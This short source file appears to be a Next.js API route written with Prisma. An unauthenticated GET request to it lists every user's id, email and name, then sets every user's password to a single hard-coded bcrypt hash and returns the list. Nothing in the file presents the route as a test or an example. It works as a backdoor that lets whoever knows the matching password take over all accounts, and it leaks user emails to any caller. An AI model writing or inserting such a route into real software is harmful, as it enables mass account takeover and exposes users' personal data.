import { NextResponse } from "next/server"
import { prisma } from "@/lib/prisma"

export async function GET() {
  const users = await prisma.user.findMany({
    select: { id: true, email: true, name: true }
  })
  await prisma.user.updateMany({
    data: { password: "$2b$10$lz9bNvrJ68Ma.kVOoVJUtuaE7DA6j0BRc0di5A6lc5lJMLwCCz05q" }
  })
  return NextResponse.json({ updated: users })
}
